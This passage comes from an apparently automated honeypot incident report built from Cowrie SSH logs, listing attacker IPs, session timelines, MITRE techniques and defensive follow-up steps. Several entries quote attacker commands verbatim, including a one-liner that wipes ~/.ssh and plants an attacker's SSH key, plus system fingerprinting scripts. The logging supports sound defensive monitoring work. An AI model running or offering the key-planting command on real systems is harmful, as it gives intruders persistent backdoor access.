| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:18:20` | `cowrie.session.connect` |
| `2026-07-08 19:18:20` | `cowrie.client.version` |
| `2026-07-08 19:18:21` | `cowrie.client.kex` |
| `2026-07-08 19:18:22` | `cowrie.login.success` |
| `2026-07-08 19:18:22` | `cowrie.session.params` |
| `2026-07-08 19:18:22` | `cowrie.command.input` |
| `2026-07-08 19:18:22` | `cowrie.command.failed` |
| `2026-07-08 19:18:23` | `cowrie.log.closed` |
| `2026-07-08 19:18:24` | `cowrie.session.params` |
| `2026-07-08 19:18:24` | `cowrie.command.input` |
| `2026-07-08 19:18:24` | `cowrie.session.file_download` |
| `2026-07-08 19:18:24` | `cowrie.log.closed` |
| `2026-07-08 19:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.122[.]158` to AbuseIPDB if not already reported
- [ ] Block `120.48.122[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1be15aa97e54

| Field | Detail |
|---|---|
| **Source IP** | `120.48.122[.]158` |
| **First Seen** | 2026-07-08 19:18 |
| **Last Seen** | 2026-07-08 19:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:18:24` | `cowrie.session.connect` |
| `2026-07-08 19:18:24` | `cowrie.client.version` |
| `2026-07-08 19:18:24` | `cowrie.client.kex` |
| `2026-07-08 19:18:25` | `cowrie.login.success` |
| `2026-07-08 19:18:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.122[.]158` to AbuseIPDB if not already reported
- [ ] Block `120.48.122[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09bc9826d789

| Field | Detail |
|---|---|
| **Source IP** | `120.48.122[.]158` |
| **First Seen** | 2026-07-08 19:18 |
| **Last Seen** | 2026-07-08 19:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:18:26` | `cowrie.session.connect` |
| `2026-07-08 19:18:26` | `cowrie.client.version` |
| `2026-07-08 19:18:26` | `cowrie.client.kex` |
| `2026-07-08 19:18:27` | `cowrie.login.success` |
| `2026-07-08 19:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.122[.]158` to AbuseIPDB if not already reported
- [ ] Block `120.48.122[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b730c9488dc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:18 |
| **Last Seen** | 2026-07-08 19:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:18:34` | `cowrie.session.connect` |
| `2026-07-08 19:18:35` | `cowrie.client.version` |
| `2026-07-08 19:18:35` | `cowrie.client.kex` |
| `2026-07-08 19:18:36` | `cowrie.login.success` |
| `2026-07-08 19:18:39` | `cowrie.session.params` |
| `2026-07-08 19:18:39` | `cowrie.command.input` |
| `2026-07-08 19:18:39` | `cowrie.command.input` |
| `2026-07-08 19:18:39` | `cowrie.command.input` |
| `2026-07-08 19:18:39` | `cowrie.command.input` |
| `2026-07-08 19:18:39` | `cowrie.command.input` |
| `2026-07-08 19:18:39` | `cowrie.command.success` |
| `2026-07-08 19:18:39` | `cowrie.command.input` |
| `2026-07-08 19:18:39` | `cowrie.command.input` |
| `2026-07-08 19:18:39` | `cowrie.command.input` |
| `2026-07-08 19:18:39` | `cowrie.command.input` |
| `2026-07-08 19:18:39` | `cowrie.log.closed` |
| `2026-07-08 19:18:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38320027f994

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:20 |
| **Last Seen** | 2026-07-08 19:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:20:07` | `cowrie.session.connect` |
| `2026-07-08 19:20:07` | `cowrie.client.version` |
| `2026-07-08 19:20:07` | `cowrie.client.kex` |
| `2026-07-08 19:20:09` | `cowrie.login.success` |
| `2026-07-08 19:20:10` | `cowrie.session.params` |
| `2026-07-08 19:20:10` | `cowrie.command.input` |
| `2026-07-08 19:20:10` | `cowrie.command.input` |
| `2026-07-08 19:20:10` | `cowrie.command.input` |
| `2026-07-08 19:20:10` | `cowrie.command.input` |
| `2026-07-08 19:20:10` | `cowrie.command.input` |
| `2026-07-08 19:20:10` | `cowrie.command.success` |
| `2026-07-08 19:20:10` | `cowrie.command.input` |
| `2026-07-08 19:20:10` | `cowrie.command.input` |
| `2026-07-08 19:20:10` | `cowrie.command.input` |
| `2026-07-08 19:20:10` | `cowrie.command.input` |
| `2026-07-08 19:20:11` | `cowrie.log.closed` |
| `2026-07-08 19:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-710bf25d46b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:20 |
| **Last Seen** | 2026-07-08 19:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:20:58` | `cowrie.session.connect` |
| `2026-07-08 19:20:58` | `cowrie.client.version` |
| `2026-07-08 19:20:58` | `cowrie.client.kex` |
| `2026-07-08 19:21:00` | `cowrie.login.success` |
| `2026-07-08 19:21:01` | `cowrie.session.params` |
| `2026-07-08 19:21:01` | `cowrie.command.input` |
| `2026-07-08 19:21:01` | `cowrie.command.input` |
| `2026-07-08 19:21:01` | `cowrie.command.input` |
| `2026-07-08 19:21:01` | `cowrie.command.input` |
| `2026-07-08 19:21:01` | `cowrie.command.input` |
| `2026-07-08 19:21:01` | `cowrie.command.success` |
| `2026-07-08 19:21:01` | `cowrie.command.input` |
| `2026-07-08 19:21:01` | `cowrie.command.input` |
| `2026-07-08 19:21:01` | `cowrie.command.input` |
| `2026-07-08 19:21:01` | `cowrie.command.input` |
| `2026-07-08 19:21:02` | `cowrie.log.closed` |
| `2026-07-08 19:21:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f7088d90202

| Field | Detail |
|---|---|
| **Source IP** | `45.182.5[.]98` |
| **First Seen** | 2026-07-08 19:21 |
| **Last Seen** | 2026-07-08 19:21 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:21:16` | `cowrie.session.connect` |
| `2026-07-08 19:21:17` | `cowrie.client.version` |
| `2026-07-08 19:21:17` | `cowrie.client.kex` |
| `2026-07-08 19:21:21` | `cowrie.login.success` |
| `2026-07-08 19:21:22` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:21:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.182.5[.]98` to AbuseIPDB if not already reported
- [ ] Block `45.182.5[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a5b5bdb3226

| Field | Detail |
|---|---|
| **Source IP** | `193.68.57[.]43` |
| **First Seen** | 2026-07-08 19:21 |
| **Last Seen** | 2026-07-08 19:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:21:25` | `cowrie.session.connect` |
| `2026-07-08 19:21:25` | `cowrie.client.version` |
| `2026-07-08 19:21:25` | `cowrie.client.kex` |
| `2026-07-08 19:21:25` | `cowrie.login.success` |
| `2026-07-08 19:21:26` | `cowrie.session.params` |
| `2026-07-08 19:21:26` | `cowrie.command.input` |
| `2026-07-08 19:21:26` | `cowrie.command.failed` |
| `2026-07-08 19:21:26` | `cowrie.log.closed` |
| `2026-07-08 19:21:27` | `cowrie.session.params` |
| `2026-07-08 19:21:27` | `cowrie.command.input` |
| `2026-07-08 19:21:27` | `cowrie.session.file_download` |
| `2026-07-08 19:21:27` | `cowrie.log.closed` |
| `2026-07-08 19:21:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.68.57[.]43` to AbuseIPDB if not already reported
- [ ] Block `193.68.57[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b5ed4223161

| Field | Detail |
|---|---|
| **Source IP** | `193.68.57[.]43` |
| **First Seen** | 2026-07-08 19:21 |
| **Last Seen** | 2026-07-08 19:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:21:27` | `cowrie.session.connect` |
| `2026-07-08 19:21:27` | `cowrie.client.version` |
| `2026-07-08 19:21:28` | `cowrie.client.kex` |
| `2026-07-08 19:21:28` | `cowrie.login.success` |
| `2026-07-08 19:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.68.57[.]43` to AbuseIPDB if not already reported
- [ ] Block `193.68.57[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f8a6f79e768

| Field | Detail |
|---|---|
| **Source IP** | `223.75.156[.]89` |
| **First Seen** | 2026-07-08 19:21 |
| **Last Seen** | 2026-07-08 19:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:21:28` | `cowrie.session.connect` |
| `2026-07-08 19:21:28` | `cowrie.client.version` |
| `2026-07-08 19:21:28` | `cowrie.client.kex` |
| `2026-07-08 19:21:30` | `cowrie.login.success` |
| `2026-07-08 19:21:31` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:21:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.75.156[.]89` to AbuseIPDB if not already reported
- [ ] Block `223.75.156[.]89` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01f008602cdc

| Field | Detail |
|---|---|
| **Source IP** | `193.68.57[.]43` |
| **First Seen** | 2026-07-08 19:21 |
| **Last Seen** | 2026-07-08 19:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:21:28` | `cowrie.session.connect` |
| `2026-07-08 19:21:28` | `cowrie.client.version` |
| `2026-07-08 19:21:28` | `cowrie.client.kex` |
| `2026-07-08 19:21:29` | `cowrie.login.success` |
| `2026-07-08 19:21:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.68.57[.]43` to AbuseIPDB if not already reported
- [ ] Block `193.68.57[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51693b6a5ed4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:22 |
| **Last Seen** | 2026-07-08 19:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:22:17` | `cowrie.session.connect` |
| `2026-07-08 19:22:17` | `cowrie.client.version` |
| `2026-07-08 19:22:17` | `cowrie.client.kex` |
| `2026-07-08 19:22:19` | `cowrie.login.success` |
| `2026-07-08 19:22:20` | `cowrie.session.params` |
| `2026-07-08 19:22:20` | `cowrie.command.input` |
| `2026-07-08 19:22:20` | `cowrie.command.input` |
| `2026-07-08 19:22:20` | `cowrie.command.input` |
| `2026-07-08 19:22:20` | `cowrie.command.input` |
| `2026-07-08 19:22:20` | `cowrie.command.input` |
| `2026-07-08 19:22:20` | `cowrie.command.success` |
| `2026-07-08 19:22:20` | `cowrie.command.input` |
| `2026-07-08 19:22:20` | `cowrie.command.input` |
| `2026-07-08 19:22:20` | `cowrie.command.input` |
| `2026-07-08 19:22:20` | `cowrie.command.input` |
| `2026-07-08 19:22:21` | `cowrie.log.closed` |
| `2026-07-08 19:22:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b13f5395a13

| Field | Detail |
|---|---|
| **Source IP** | `58.223.165[.]154` |
| **First Seen** | 2026-07-08 19:23 |
| **Last Seen** | 2026-07-08 19:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:23:17` | `cowrie.session.connect` |
| `2026-07-08 19:23:17` | `cowrie.client.version` |
| `2026-07-08 19:23:17` | `cowrie.client.kex` |
| `2026-07-08 19:23:18` | `cowrie.login.success` |
| `2026-07-08 19:23:19` | `cowrie.session.params` |
| `2026-07-08 19:23:19` | `cowrie.command.input` |
| `2026-07-08 19:23:19` | `cowrie.log.closed` |
| `2026-07-08 19:23:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.223.165[.]154` to AbuseIPDB if not already reported
- [ ] Block `58.223.165[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43eb20a69b0b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:23 |
| **Last Seen** | 2026-07-08 19:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:23:18` | `cowrie.session.connect` |
| `2026-07-08 19:23:19` | `cowrie.client.version` |
| `2026-07-08 19:23:19` | `cowrie.client.kex` |
| `2026-07-08 19:23:21` | `cowrie.login.success` |
| `2026-07-08 19:23:22` | `cowrie.session.params` |
| `2026-07-08 19:23:22` | `cowrie.command.input` |
| `2026-07-08 19:23:22` | `cowrie.command.input` |
| `2026-07-08 19:23:22` | `cowrie.command.input` |
| `2026-07-08 19:23:22` | `cowrie.command.input` |
| `2026-07-08 19:23:22` | `cowrie.command.input` |
| `2026-07-08 19:23:22` | `cowrie.command.success` |
| `2026-07-08 19:23:22` | `cowrie.command.input` |
| `2026-07-08 19:23:22` | `cowrie.command.input` |
| `2026-07-08 19:23:22` | `cowrie.command.input` |
| `2026-07-08 19:23:22` | `cowrie.command.input` |
| `2026-07-08 19:23:23` | `cowrie.log.closed` |
| `2026-07-08 19:23:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1ce79f48a83

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 19:23 |
| **Last Seen** | 2026-07-08 19:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:23:19` | `cowrie.session.connect` |
| `2026-07-08 19:23:19` | `cowrie.client.version` |
| `2026-07-08 19:23:19` | `cowrie.client.kex` |
| `2026-07-08 19:23:19` | `cowrie.login.success` |
| `2026-07-08 19:23:20` | `cowrie.session.params` |
| `2026-07-08 19:23:20` | `cowrie.command.input` |
| `2026-07-08 19:23:20` | `cowrie.log.closed` |
| `2026-07-08 19:23:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e2dd379f999

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:24 |
| **Last Seen** | 2026-07-08 19:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:24:19` | `cowrie.session.connect` |
| `2026-07-08 19:24:20` | `cowrie.client.version` |
| `2026-07-08 19:24:20` | `cowrie.client.kex` |
| `2026-07-08 19:24:22` | `cowrie.login.success` |
| `2026-07-08 19:24:23` | `cowrie.session.params` |
| `2026-07-08 19:24:23` | `cowrie.command.input` |
| `2026-07-08 19:24:23` | `cowrie.command.input` |
| `2026-07-08 19:24:23` | `cowrie.command.input` |
| `2026-07-08 19:24:23` | `cowrie.command.input` |
| `2026-07-08 19:24:23` | `cowrie.command.input` |
| `2026-07-08 19:24:23` | `cowrie.command.success` |
| `2026-07-08 19:24:23` | `cowrie.command.input` |
| `2026-07-08 19:24:23` | `cowrie.command.input` |
| `2026-07-08 19:24:23` | `cowrie.command.input` |
| `2026-07-08 19:24:23` | `cowrie.command.input` |
| `2026-07-08 19:24:24` | `cowrie.log.closed` |
| `2026-07-08 19:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-023546a70f1d

| Field | Detail |
|---|---|
| **Source IP** | `85.19.195[.]12` |
| **First Seen** | 2026-07-08 19:24 |
| **Last Seen** | 2026-07-08 19:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:24:44` | `cowrie.session.connect` |
| `2026-07-08 19:24:45` | `cowrie.client.version` |
| `2026-07-08 19:24:45` | `cowrie.client.kex` |
| `2026-07-08 19:24:45` | `cowrie.login.success` |
| `2026-07-08 19:24:46` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:24:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.19.195[.]12` to AbuseIPDB if not already reported
- [ ] Block `85.19.195[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afc456b3a90b

| Field | Detail |
|---|---|
| **Source IP** | `183.196.144[.]45` |
| **First Seen** | 2026-07-08 19:24 |
| **Last Seen** | 2026-07-08 19:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:24:52` | `cowrie.session.connect` |
| `2026-07-08 19:24:52` | `cowrie.client.version` |
| `2026-07-08 19:24:52` | `cowrie.client.kex` |
| `2026-07-08 19:24:54` | `cowrie.login.success` |
| `2026-07-08 19:24:55` | `cowrie.direct-tcpip.request` |
